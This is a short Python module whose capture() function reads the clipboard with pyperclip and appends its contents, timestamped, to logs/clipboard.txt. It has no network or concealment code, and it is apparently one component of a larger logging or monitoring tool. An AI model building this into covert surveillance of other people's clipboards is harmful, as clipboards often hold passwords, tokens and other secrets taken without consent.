import pyperclip
from datetime import datetime

LOG_FILE = "logs/clipboard.txt"

def capture():
    try:
        clipboard_data = pyperclip.paste()
        if clipboard_data:
            with open(LOG_FILE, "a") as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"{timestamp}: {clipboard_data} \n")
    except Exception as e:
        print(f"[ERROR] Clipboard capture failed: {e}")